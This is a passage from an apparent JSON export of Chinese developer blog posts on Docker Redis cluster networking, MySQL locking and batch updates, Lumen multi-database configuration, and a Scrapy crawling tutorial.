cellspacing=\"0\"><tbody><tr><td>\n\t\t\t\t<p>1</p>\n\n\t\t\t\t<p>2</p>\n\n\t\t\t\t<p>3</p>\n\n\t\t\t\t<p>4</p>\n\t\t\t\t</td>\n\t\t\t\t<td>\n\t\t\t\t<p><code>192.168.10.52:6383&gt; </code><code>select</code> <code>0</code></p>\n\n\t\t\t\t<p><code>OK</code></p>\n\n\t\t\t\t<p><code>192.168.10.52:6383&gt; </code><code>select</code> <code>1</code></p>\n\n\t\t\t\t<p><code>(error) ERR SELECT is not allowed </code><code>in</code> <code>cluster mode</code></p>\n\t\t\t\t</td>\n\t\t\t</tr></tbody></table><p> </p>\n\t</li>\n</ol><p> </p>\n\n<ol><li>近期，有网友询问docker redis集群连接报错的问题，具体报错如下：<br><br>\n\t　<img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWFnZXMyMDE4LmNuYmxvZ3MuY29tL2Jsb2cvOTk2MjUzLzIwMTgwOC85OTYyNTMtMjAxODA4MDkwOTUzMjg2MDYtMTM1NDk0MzI4MS5wbmc?x-oss-process=image/format,png\"><p> </p>\n\t初步认为是，node节点没有全部添加进去，添加之后，依然有上述问题。想到是跨主机访问，应该是路由寻址不了导致的。当初写上述教程的时候，docker是以默认的网络模式bridge模式运行的，毕竟当初是以学习整理文档为主，主要是单机访问。但是，实际应用化场景中，多是公网跨主机访问，问题明朗了，想着集群这东西最好还是设置成共享主机公网ip比较好，于是解决如下：\n\n\t<ol><li>在docker运行时，执行网络模式为：host。</li>\n\t\t<li>端口冲突解决，毕竟host模式下，容器会占用宿主机的端口，于是，我们就从配置下手，在宿主机上生成配置redis-60001.conf,redis-60002.conf,redis-60003.conf...，有多少端口建多少个文件，最终运行一个容器，挂载一个配置到容器中用于覆盖主机中的配置。<br>\n\t\t最终的运行方式如下：\n\t\t<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tbody><tr><td>\n\t\t\t\t\t<p>1</p>\n\t\t\t\t\t</td>\n\t\t\t\t\t<td>\n\t\t\t\t\t<p><code>docker run -d --name redis-6380 --net host -</code><code>v</code> <code>/tmp/redis</code><code>.conf:</code><code>/usr/local/redis/redis</code><code>.conf  hakimdstx</code><code>/nodes-redis</code><code>:4.0.1</code></p>\n\t\t\t\t\t</td>\n\t\t\t\t</tr></tbody></table><p><br>\n\t\t至此，网络问题得到解决。<br>\n\t\tPS.生产环境需要注意防火墙问题，不然也是会报错的。　</p>\n\t\t</li>\n\t</ol></li>\n</ol>                                    </div>", "log_PostTime": 1584891269, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "Mysql悲观锁以及乐观锁案例说明", "log_Intro": "Mysql悲观锁以及乐观锁案例说明", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <h1><strong>悲观锁介绍：</strong></h1>\n\n<p>悲观锁，正如其名，它指的是对数据被外界（包括本系统当前的其他事务，以及来自外部系统的事务处理）修改持保守态度，因此，在整个数据处理过程中，将数据处于锁定状态。悲观锁的实现，往往依靠数据库提供的锁机制（也只有数据库层提供的锁机制才能真正保证数据访问的排他性，否则，即使在本系统中实现了加锁机制，也无法保证外部系统不会修改数据）。</p>\n\n<p> </p>\n\n<h2><strong>使用场景举例：以MySQL InnoDB为例</strong></h2>\n\n<p>商品goods表中有一个字段status，status为1代表商品未被下单，status为2代表商品已经被下单，那么我们对某个商品下单时必须确保该商品status为1。假设商品的id为1。</p>\n\n<p> </p>\n\n<h3><strong>1如果不采用锁，那么操作方法如下：</strong></h3>\n\n<pre class=\"has\">\n<code class=\"language-sql\">//1.查询出商品信息\n\nselect status from t_goods where id=1;\n\n//2.根据商品信息生成订单\n\ninsert into t_orders (id,goods_id) values (null,1);\n\n//3.修改商品status为2\n\nupdate t_goods set status=2;</code></pre>\n\n<p> </p>\n\n<p>上面这种场景在高并发访问的情况下很可能会出现问题。</p>\n\n<p>前面已经提到，只有当goods status为1时才能对该商品下单，上面第一步操作中，查询出来的商品status为1。但是当我们执行第三步Update操作的时候，有可能出现其他人先一步对商品下单把goods status修改为2了，但是我们并不知道数据已经被修改了，这样就可能造成同一个商品被下单2次，使得数据不一致。所以说这种方式是不安全的。</p>\n\n<p> </p>\n\n<h3><strong>2使用悲观锁来实现：</strong></h3>\n\n<p>在上面的场景中，商品信息从查询出来到修改，中间有一个处理订单的过程，使用悲观锁的原理就是，当我们在查询出goods信息后就把当前的数据锁定，直到</p>                                    </div>", "log_PostTime": 1584891270, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "Lumen框架多数据库连接配置方法", "log_Intro": "Lumen框架多数据库连接配置方法", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <p><strong>Lumen</strong>作为一款API导向很浓的框架，配置极简化，默认只支持一路DB配置</p>\n\n<p>然而随着业务复杂度的提高，引入多个数据库连接似乎无法避免，下面介绍一下LUMEN连接多个数据库的配置方法：</p>\n\n<ul><li>修改.env文件，增加新DB配置，如下：</li>\n</ul><pre class=\"has\">\n<code>//DB1 配置\n\nDB_CONNECTION=mysql\n\nDB_HOST=127.0.0.1\n\nDB_PORT=3306\n\nDB_DATABASE=dbname\n\nDB_USERNAME=dbname\n\nDB_PASSWORD=password\n\nDB_TIMEOUT=4\n\n//DB2配置\n\nDB_TEST_CONNECTION=mysql\n\nDB_TEST_HOST=127.0.0.1\n\nDB_TEST_PORT=3307\n\nDB_TEST_DATABASE=dbname2\n\nDB_TEST_USERNAME=dbname2\n\nDB_TEST_PASSWORD=password\n\nDB_TEST_TIMEOUT=4\n</code></pre>\n\n<ul><li>因为LUMEN在加载DB配置时，还是会默认去laravel模块下寻找相关配置文件，这时修改laravel模块下的database.php文件<br>\n\t文件位置在:<br>\n\t./vendor/laravel/lumen-framework/config/database.php<br>\n\t添加.env文件中新增的DB配置，如下：</li>\n</ul><p> </p>\n\n<pre class=\"has\">\n<code>//默认配置\n        'mysql' =&gt; [\n            'driver'    =&gt; 'mysql',\n            'host'      =&gt; env('DB_HOST', 'localhost'),\n            'port'      =&gt; env('DB_PORT', 3306),\n            'database'  =&gt; env('DB_DATABASE', 'forge'),\n            'username'  =&gt; env('DB_USERNAME', 'forge'),\n            'password'  =&gt; env('DB_PASSWORD', ''),\n            'charset'   =&gt; env('DB_CHARSET', 'utf8'),\n            'collation' =&gt; env('DB_COLLATION', 'utf8_unicode_ci'),\n            'prefix'    =&gt; env('DB_PREFIX', ''),\n            'timezone'  =&gt; env('DB_TIMEZONE', '+00:00'),\n            'strict'    =&gt; env('DB_STRICT_MODE', false),\n        ],\n\n//新增配置\n        'mysql_test'=&gt;[\n            'driver'    =&gt; 'mysql',\n            'host'      =&gt; env('DB_TEST_HOST', 'localhost'),\n            'port'      =&gt; env('DB_TEST_PORT', 3306),\n            'database'  =&gt; env('DB_TEST_DATABASE', 'forge'),\n            'username'  =&gt; env('DB_TEST_USERNAME', 'forge'),\n            'password'  =&gt; env('DB_TEST_PASSWORD', ''),\n            'charset'   =&gt; env('DB_CHARSET', 'utf8'),\n            'collation' =&gt; env('DB_COLLATION', 'utf8_unicode_ci'),\n            'prefix'    =&gt; env('DB_PREFIX', ''),\n            'timezone'  =&gt; env('DB_TIMEZONE', '+00:00'),\n            'strict'    =&gt; env('DB_STRICT_MODE', false),\n        ],\n\n</code></pre>\n\n<ul><li>在项目中调用时，直接按database.php中的做法初始化connection就行，如下：</li>\n</ul><pre class=\"has\">\n<code>$query = app('db')-&gt;connection(\"mysql_test\")-&gt;select(\"...\");</code></pre>\n\n<p> </p>\n                                    </div>", "log_PostTime": 1584891272, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "MySql数据库Update批量更新与批量更新多条记录的不同值实现方法", "log_Intro": "MySql数据库Update批量更新与批量更新多条记录的不同值实现方法", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <h3>批量更新</h3>\n\n<p>mysql更新语句很简单，更新一条数据的某个字段，一般这样写：</p>\n\n<pre class=\"has\">\n<code>UPDATE mytable SET myfield = 'value' WHERE other_field = 'other_value';</code></pre>\n\n<p>如果更新同一字段为同一个值，mysql也很简单，修改下where即可：</p>\n\n<pre class=\"has\">\n<code>UPDATE mytable SET myfield = 'value' WHERE other_field in ('other_values');</code></pre>\n\n<p>这里注意 ‘other_values' 是一个逗号（，）分隔的字符串，如：1,2,3</p>\n\n<p>那如果更新多条数据为不同的值，可能很多人会这样写：</p>\n\n<pre class=\"has\">\n<code>foreach ($display_order as $id =&gt; $ordinal) { \n    $sql = \"UPDATE categories SET display_order = $ordinal WHERE id = $id\"; \n    mysql_query($sql); \n}</code></pre>\n\n<p>即是循环一条一条的更新记录。一条记录update一次，这样性能很差，也很容易造成阻塞。</p>\n\n<p>那么能不能一条sql语句实现批量更新呢？mysql并没有提供直接的方法来实现批量更新，但是可以用点小技巧来实现。</p>\n\n<pre class=\"has\">\n<code>UPDATE mytable \n    SET myfield = CASE id \n        WHEN 1 THEN 'value'\n        WHEN 2 THEN 'value'\n        WHEN 3 THEN 'value'\n    END\nWHERE id IN (1,2,3)</code></pre>\n\n<p>这里使用了case when 这个小技巧来实现批量更新。<br>\n举个例子：</p>\n\n<pre class=\"has\">\n<code>UPDATE categories \n    SET display_order = CASE id \n        WHEN 1 THEN 3 \n        WHEN 2 THEN 4 \n        WHEN 3 THEN 5 \n    END\nWHERE id IN (1,2,3)</code></pre>\n\n<p>这句sql的意思是，更新display_order 字段，如果id=1 则display_order 的值为3，如果id=2 则 display_order 的值为4，如果id=3 则 display_order 的值为5。<br>\n即是将条件语句写在了一起。<br>\n这里的where部分不影响代码的执行，但是会提高sql执行的效率。确保sql语句仅执行需要修改的行数，这里只有3条数据进行更新，而where子句确保只有3行数据执行。</p>\n\n<p>如果更新多个值的话，只需要稍加修改：</p>\n\n<p> </p>\n\n<pre class=\"has\">\n<code>UPDATE categories \n    SET display_order = CASE id \n        WHEN 1 THEN 3 \n        WHEN 2 THEN 4 \n        WHEN 3 THEN 5 \n    END, \n    title = CASE id \n        WHEN 1 THEN 'New Title 1'\n        WHEN 2 THEN 'New Title 2'\n        WHEN 3 THEN 'New Title 3'\n    END\nWHERE id IN (1,2,3)</code></pre>\n\n<p> </p>\n\n<p>到这里，已经完成一条mysql语句更新多条记录了。<br>\n但是要在业务中运用，需要结合服务端语言，这里以php为例，构造这条mysql语句：</p>\n\n<pre class=\"has\">\n<code>$display_order = array( \n    1 =&gt; 4, \n    2 =&gt; 1, \n    3 =&gt; 2, \n    4 =&gt; 3, \n    5 =&gt; 9, \n    6 =&gt; 5, \n    7 =&gt; 8, \n    8 =&gt; 9 \n); \n$ids = implode(',', array_keys($display_order)); \n$sql = \"UPDATE categories SET display_order = CASE id \"; \nforeach ($display_order as $id =&gt; $ordinal) { \n    $sql .= sprintf(\"WHEN %d THEN %d \", $id, $ordinal); \n} \n$sql .= \"END WHERE id IN ($ids)\"; \necho $sql;</code></pre>\n\n<p> </p>\n\n<p>这个例子，有8条记录进行更新。代码也很容易理解，你学会了吗</p>\n\n<p>性能分析</p>\n\n<p>当我使用上万条记录利用mysql批量更新，发现使用最原始的批量update发现性能很差，将网上看到的总结一下一共有以下三种办法：</p>\n\n<p>1.批量update，一条记录update一次，性能很差</p>\n\n<pre>\nupdate test_tbl set dr='2' where id=1;</pre>\n\n<p>2.replace into 或者insert into ...on duplicate key update</p>\n\n<pre>\nreplace into test_tbl (id,dr) values (1,'2'),(2,'3'),...(x,'y');</pre>\n\n<p>或者使用</p>\n\n<pre>\ninsert into test_tbl (id,dr) values  (1,'2'),(2,'3'),...(x,'y') on duplicate key update dr=values(dr);</pre>\n\n<p>3.创建临时表，先更新临时表，然后从临时表中update</p>\n\n<p> 代码如下</p>\n\n<pre>\ncreate temporary table tmp(id int(4) primary key,dr varchar(50));\ninsert into tmp values  (0,'gone'), (1,'xx'),...(m,'yy');\nupdate test_tbl, tmp set test_tbl.dr=tmp.dr where test_tbl.id=tmp.id; </pre>\n\n<p>注意：这种方法需要用户有temporary 表的create 权限。</p>\n\n<p>下面是上述方法update 100000条数据的性能测试结果：</p>\n\n<pre>\n逐条update\n\nreal    0m15.557s\nuser    0m1.684s\nsys    0m1.372s\n\nreplace into\nreal    0m1.394s\nuser    0m0.060s\nsys    0m0.012s\n\ninsert into on duplicate key update\nreal    0m1.474s\nuser    0m0.052s\nsys    0m0.008s\n\ncreate temporary table and update:\nreal    0m0.643s\nuser    0m0.064s\nsys    0m0.004s</pre>\n\n<p>就测试结果来看，测试当时使用replace into性能较好。</p>\n\n<p>replace into  和insert into on duplicate key update的不同在于：<br>\nreplace into　操作本质是对重复的记录先delete 后insert，如果更新的字段不全会将缺失的字段置为缺省值<br>\ninsert into 则是只update重复记录，不会改变其它字段。</p>\n                                    </div>", "log_PostTime": 1584891273, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "Python:爬虫框架Scrapy的安装与基本使用", "log_Intro": "Python:爬虫框架Scrapy的安装与基本使用", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <p><strong>一、简单实例，了解基本。</strong></p>\n\n<p><strong>1、安装Scrapy框架</strong></p>\n\n<p>这里如果直接pip3 install scrapy可能会出错。</p>\n\n<p>所以你可以先安装lxml：pip3 install lxml(已安装请忽略)。</p>\n\n<p>安装pyOpenSSL：在官网下载wheel文件。</p>\n\n<p>安装Twisted：在官网下载wheel文件。</p>\n\n<p>安装PyWin32：在官网下载wheel文件。</p>\n\n<p>下载地址：https://www.lfd.uci.edu/~gohlke/pythonlibs/</p>\n\n<p>配置环境变量：将scrapy所在目录添加到系统环境变量即可。</p>\n\n<p>ctrl+f搜索即可。</p>\n\n<p>最后安装scrapy，pip3 install scrapy</p>\n\n<p><strong>2、创建一个scrapy项目</strong></p>\n\n<p>新创建一个目录，按住shift-右键-在此处打开命令窗口</p>\n\n<p>输入：scrapy startproject tutorial即可创建一个tutorial文件夹</p>\n\n<p>文件夹目录如下：</p>\n\n<blockquote>\n<p>|-tutorial</p>\n\n<p>|-scrapy.cfg</p>\n\n<p>  |-__init__.py</p>\n\n<p>  |-items.py</p>\n\n<p>  |-middlewares.py</p>\n\n<p>  |-pipelines.py</p>\n\n<p>  |-settings.py</p>\n\n<p>  |-spiders</p>\n\n<p>    |-__init__.py</p>\n</blockquote>\n\n<p><strong>文件的功能：</strong></p>\n\n<p>scrapy.cfg：配置文件</p>\n\n<p>spiders：存放你Spider文件，也就是你爬取的py文件</p>\n\n<p>items.py：相当于一个容器，和字典较像</p>\n\n<p>middlewares.py：定义Downloader Middlewares(下载器中间件)和Spider Middlewares(蜘蛛中间件)的实现</p>\n\n<p>pipelines.py:定义Item Pipeline的实现，实现数据的清洗，储存，验证。</p>\n\n<p>settings.py：全局配置</p>\n\n<p><strong>3、创建一个spider（自己定义的爬虫文件）</strong></p>\n\n<p>例如以爬取猫眼热映口碑榜为例子来了解一下：</p>\n\n<p>在spiders文件夹下创建一个maoyan.py文件，你也可以按住shift-右键-在此处打开命令窗口，输入：scrapy genspider 文件名 要爬取的网址。</p>\n\n<p>自己创建的需要自己写，使用命令创建的包含最基本的东西。</p>\n\n<p>我们来看一下使用命令创建的有什么。</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy85NDg5MTkzLWFlNDQ0NjNkMDA4OWU4Zjc_aW1hZ2VNb2dyMi9hdXRvLW9yaWVudC9zdHJpcHxpbWFnZVZpZXcyLzIvdy81NzMvZm9ybWF0L3dlYnA?x-oss-process=image/format,png\"></p>\n\n<p>介绍一下这些是干嘛的：</p>\n\n<p>name：是项目的名字</p>\n\n<p>allowed_domains：是允许爬取的域名，比如一些网站有相关链接，域名就和本网站不同，这些就会忽略。</p>\n\n<p>atart_urls：是Spider爬取的网站，定义初始的请求url，可以多个。</p>\n\n<p>parse方法：是Spider的一个方法，在请求start_url后，之后的方法，这个方法是对网页的解析，与提取自己想要的东西。</p>\n\n<p>response参数：是请求网页后返回的内容，也就是你需要解析的网页。</p>\n\n<p>还有其他参数有兴趣可以去查查。</p>\n\n<p><strong>4、定义Item</strong></p>\n\n<p>item是保存爬取数据的容器，使用的方法和字典差不多。</p>\n\n<p>我们打开items.py，之后我们想要提取的信息有：</p>\n\n<p>index(排名)、title(电影名)、star(主演)、releasetime(上映时间)、score(评分)</p>\n\n<p>于是我们将items.py文件修改成这样。</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy85NDg5MTkzLWExMjc0MTA1YmZhYmFkYzI_aW1hZ2VNb2dyMi9hdXRvLW9yaWVudC9zdHJpcHxpbWFnZVZpZXcyLzIvdy83NTgvZm9ybWF0L3dlYnA?x-oss-process=image/format,png\"></p>\n\n<p>即可。</p>\n\n<p><strong>5、再次打开spider来提取我们想要的信息</strong></p>\n\n<p>修改成这样：</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy85NDg5MTkzLTkyOGY4M2VmMTA4YjE4NTI_aW1hZ2VNb2dyMi9hdXRvLW9yaWVudC9zdHJpcHxpbWFnZVZpZXcyLzIvdy8xMDgwL2Zvcm1hdC93ZWJw?x-oss-process=image/format,png\"></p>\n\n<p>好了，一个简单的爬虫就写完了。</p>\n\n<p><strong>6、运行</strong></p>\n\n<p>在该文件夹下，按住shift-右键-在此处打开命令窗口，输入：scrapy crawl maoyan(项目的名字)</p>\n\n<p>即可看到：</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy85NDg5MTkzLTNmMzVmN2MyM2UzMDVhYTI_aW1hZ2VNb2dyMi9hdXRvLW9yaWVudC9zdHJpcHxpbWFnZVZpZXcyLzIvdy8xMDgwL2Zvcm1hdC93ZWJw?x-oss-process=image/format,png\"></p>\n\n<p><strong>7、保存</strong></p>\n\n<p>我们只运行了代码，看看有没有报错，并没有保存。</p>\n\n<p>如果我们想保存为csv、xml、json格式，可以直接使用命令：</p>\n\n<p>在该文件夹下，按住shift-右键-在此处打开命令窗口，输入：</p>\n\n<p>scrapy crawl maoyan -o maoyan.csv</p>\n\n<p>scrapy crawl maoyan -o maoyan.xml</p>\n\n<p>scrapy crawl maoyan -o maoyan.json</p>\n\n<p>选择其中一个即可。当然如果想要保存为其他格式也是可以的，这里只说常见的。这里选择json格式，运行后会发现，在文件夹下多出来一个maoyan.json的文件。打开之后发现，中文都是一串乱码，这里需要修改编码方式，当然也可以在配置里修改</p>\n\n<p>（在settings.py文件中添加FEED_EXPORT_ENCODING='UTF8'即可），</p>\n\n<p>如果想直接在命令行中修改：</p>\n\n<p>scrapy crawl maoyan -o maoyan.json -s FEED_EXPORT_ENCODING=UTF8</p>\n\n<p>即可。</p>\n\n<p>这里自己试试效果吧。</p>\n\n<p>当然我们保存也可以在运行的时候自动保存，不需要自己写命令。后面介绍（我们还有还多文件没有用到呦）。</p>\n\n<p><strong>二、scrapy如何解析？</strong></p>\n\n<p>之前写过一篇文章：<a href=\"http://mp.weixin.qq.com/s?__biz=MzU0NDg3NDg0Ng==&amp;mid=2247483766&amp;idx=1&amp;sn=86d61115ebb7a4083e17a54f1acffdf1&amp;chksm=fb74c947cc03405122d74b1172a9a96ef35af65753666f3f7900a9318290c4326736c2d6e69e&amp;scene=21#wechat_redirect\" rel=\"nofollow\">三大解析库的使用</a></p>\n\n<p>但是scrapy也提供了自己的解析方式（Selector），和上面的也很相似，我们来看一下：</p>\n\n<p><strong>1、css</strong></p>\n\n<p>首先需要导入模块：from scrapy import Selector</p>\n\n<p>例如有这样一段html代码：</p>\n\n<p>html='&lt;html&gt;&lt;head&gt;&lt;title&gt;Demo&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;div class='cla'&gt;This is Demo&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;</p>\n\n<p><strong>1.1、首先需要构建一个Selector对象</strong></p>\n\n<p>sel = Selector(html)</p>\n\n<p>text = sel.css('.cla::text').extract_first()</p>\n\n<p>.cla表示选中上面的div节点，::text表示获取文本，这里和以前的有所不同。</p>\n\n<p>extract_first()表示返回第一个元素，因为上述 sel.css('.cla::text')返回的是一个列表，你也可以写成sel.css('.cla::text')[0]来获取第一个元素，但是如果为空，就会报出超出最大索引的错误，不建议这样写，而使用extract_first()就不会报错，同时如果写成extract_first('123')这样，如果为空就返回123</p>\n\n<p><strong>1.2、</strong>有了选取第一个，就有选取所有：extract()表示选取所有，如果返回的是多个值，就可以是这样写。</p>\n\n<p><strong>1.3、</strong>获取属性就是sel.css('.cla::sttr('class')').extract_first()表示获取class</p>\n\n<p><strong>1.4、</strong>获取指定属性的文本：sel.css('div[class=\"cla\"]::text')</p>\n\n<p><strong>1.5、</strong>其他写法和css的写法如出一辙。</p>\n\n<p><strong>1.6、</strong>在scrapy中为我们提供了一个简便的写法，在上述的简单实例中，我们知道了response为请求网页的返回值。</p>\n\n<p>我们可以直接写成：response.css()来解析，提取我们想要的信息。同样，下面要说的XPath也可以直接写成：</p>\n\n<p>response.xpath()来解析。</p>\n\n<p><strong>2、Xpath</strong></p>\n\n<p>Xpath的使用可以看上面的文章：<a href=\"http://mp.weixin.qq.com/s?__biz=MzU0NDg3NDg0Ng==&amp;mid=2247483766&amp;idx=1&amp;sn=86d61115ebb7a4083e17a54f1acffdf1&amp;chksm=fb74c947cc03405122d74b1172a9a96ef35af65753666f3f7900a9318290c4326736c2d6e69e&amp;scene=21#wechat_redirect\" rel=\"nofollow\">三大解析库的使用</a></p>\n\n<p>注意：获取的还是列表，所以还是要加上extract_first()或者extract()</p>\n\n<p><strong>3、正则匹配(这里用response操作)</strong></p>\n\n<p>例如：response.css('a::text').re('写正则')</p>\n\n<p>这里如果response.css('a::text')匹配的是多个对象，那么加上正则也是匹配符合要求的多个对象。</p>\n\n<p>这里如果想要匹配第一个对象，可以把re()修改成re_first()即可。</p>\n\n<p><strong>注意：response不可以直接调用re(),response.xpath('.').re()可以相当于达到直接使用正则的效果</strong>。</p>\n\n<p>正则的使用：<a href=\"http://mp.weixin.qq.com/s?__biz=MzU0NDg3NDg0Ng==&amp;mid=2247483727&amp;idx=1&amp;sn=1fc19af2291177ac3c1a832c47392a3f&amp;chksm=fb74c97ecc0340681bc54c97ceb7bba413da3f1ca6fc3a107bbdabe7eb9be144c261a6de347d&amp;scene=21#wechat_redirect\" rel=\"nofollow\">万能的正则表达式</a></p>\n\n<p><strong>三、Dowmloader Middleware的使用</strong></p>\n\n<p>本身scrapy就提供了很多Dowmloader Middleware，但是有时候我们要修改，</p>\n\n<p>比如修改User-Agent，使用代理ip等。</p>\n\n<p>以修改User-Agent为例（设置代理ip大同小异）：</p>\n\n<p>第一种方法，可以在settings.py中直接添加USER-AGENT='xxx'</p>\n\n<p>但是我们想要添加多个User-Agent，每次随机获取一个可以利用Dowmloader Middleware来设置。</p>\n\n<p>第一步将settings中的USER-AGENT='xxx'修改成USER-AGENT=[\"xxx\",\"xxxxx\",\"xxxxxxx\"]</p>\n\n<p>第二步在middlewares.py中添加：</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy85NDg5MTkzLTVhNzk0NjE4ZGI2NWEyOGY_aW1hZ2VNb2dyMi9hdXRvLW9yaWVudC9zdHJpcHxpbWFnZVZpZXcyLzIvdy8xMDYyL2Zvcm1hdC93ZWJw?x-oss-process=image/format,png\"></p>\n\n<p>from_crawler():通过参数crawler可以拿到配置的信息，我们的User-Agent在配置文件里，所以我们需要获取到。</p>\n\n<p>方法名不可以修改。</p>\n\n<p>第三步在settings.py中添加：</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy85NDg5MTkzLTNkNTEyNGRmZDMxZTc2MDI_aW1hZ2VNb2dyMi9hdXRvLW9yaWVudC9zdHJpcHxpbWFnZVZpZXcyLzIvdy85MTQvZm9ybWF0L3dlYnA?x-oss-process=image/format,png\"></p>\n\n<p>将scrapy自带的UserAgentmiddleware的键值设置为None,</p>\n\n<p>自定义的设置为400，这个键值越小表示优先调用的意思。</p>\n\n<p><strong>四、Item Pipeline的使用。</strong></p>\n\n<p><strong>1、进行数据的清洗</strong></p>\n\n<p>在一的实例中我们把评分小于等于8.5分的score修改为（不好看！），我们认为是不好看的电影，我们将pipeline.py修改成这样：</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy85NDg5MTkzLTIzMDIxMjA5ZGEyMDdiNzE_aW1hZ2VNb2dyMi9hdXRvLW9yaWVudC9zdHJpcHxpbWFnZVZpZXcyLzIvdy82NzgvZm9ybWF0L3dlYnA?x-oss-process=image/format,png\"></p>\n\n<p>在setting.py中添加：</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy85NDg5MTkzLTBjZjIxYzEzY2QyNDYzNWM_aW1hZ2VNb2dyMi9hdXRvLW9yaWVudC9zdHJpcHxpbWFnZVZpZXcyLzIvdy81ODAvZm9ybWF0L3dlYnA?x-oss-process=image/format,png\"></p>\n\n<p>我们执行一下：</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy85NDg5MTkzLWRiZWZhNWJkYjI4ZjM0NWM_aW1hZ2VNb2dyMi9hdXRvLW9yaWVudC9zdHJpcHxpbWFnZVZpZXcyLzIvdy8xMDI5L2Zvcm1hdC93ZWJw?x-oss-process=image/format,png\"></p>\n\n<p><strong>2、储存</strong></p>\n\n<p><strong>2.1储存为json格式</strong></p>\n\n<p>我们将pipeline.py修改成这样：</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy85NDg5MTkzLTI5MmZlMDBkYTQwMjhiOTY_aW1hZ2VNb2dyMi9hdXRvLW9yaWVudC9zdHJpcHxpbWFnZVZpZXcyLzIvdy84NjAvZm9ybWF0L3dlYnA?x-oss-process=image/format,png\"></p>\n\n<p>在setting.py中添加：</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy85NDg5MTkzLWYxYjVmN2EyZWNkOTVmOTM_aW1hZ2VNb2dyMi9hdXRvLW9yaWVudC9zdHJpcHxpbWFnZVZpZXcyLzIvdy82MTYvZm9ybWF0L3dlYnA?x-oss-process=image/format,png\"></p>\n\n<p>表示先执行TextPipeline方法，再执行JsonPipeline方法，先清洗，再储存。</p>\n\n<p><strong>2.2储存在mysql数据库</strong></p>\n\n<p>首先在mysql数据库中创建一个数据库maoyanreying，创建一个表maoyan。</p>\n\n<p>我们将pipeline.py修改成这样：</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy85NDg5MTkzLWNjMDVkNjBmY2Q2ZGZhYjM_aW1hZ2VNb2dyMi9hdXRvLW9yaWVudC9zdHJpcHxpbWFnZVZpZXcyLzIvdy8xMDE1L2Zvcm1hdC93ZWJw?x-oss-process=image/format,png\"></p>\n\n<p>在setting.py中添加：</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy85NDg5MTkzLWVhYTYyMGRmYzliZDgxOTg_aW1hZ2VNb2dyMi9hdXRvLW9yaWVudC9zdHJpcHxpbWFnZVZpZXcyLzIvdy81NjYvZm9ybWF0L3dlYnA?x-oss-process=image/format,png\"></p>\n\n<p> </p>\n                                    </div>", "log_PostTime": 1584891274, "log_Meta": ""}
